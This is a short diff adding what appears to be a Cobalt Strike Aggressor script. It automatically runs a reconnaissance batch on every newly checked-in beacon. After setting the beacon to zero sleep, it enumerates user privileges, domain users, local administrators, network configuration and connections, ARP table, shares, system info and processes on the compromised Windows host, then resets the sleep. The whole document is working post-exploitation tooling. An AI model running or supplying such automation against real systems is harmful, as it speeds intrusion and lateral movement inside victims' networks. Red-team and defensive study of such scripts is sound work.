@@ -1,0 +1,31 @@
+on beacon_initial {
+
+# checkin, sleep to 0s, list pwd	
+	binput($1, "checkin");
+	bcheckin($1);
+	bsleep($1, 0, 0);
+	bpwd($1);
+
+#list user groups 
+	bshell($1, "whoami /all");
+
+#list user info 
+	bshell($1, "net users %username% /domain");
+	bshell($1, "net localgroup administrators");
+
+#list network info 
+	bshell($1, "ipconfig /all");
+	bshell($1, "netstat -ano");
+	bshell($1, "arp -A");
+
+#list shares 
+	bshell($1, "net use");
+
+#list sysinfo and process list
+	bshell($1, "systeminfo");
+	bps($1);
+
+#reset sleep
+	bsleep($1, 5, 30);
+
+}
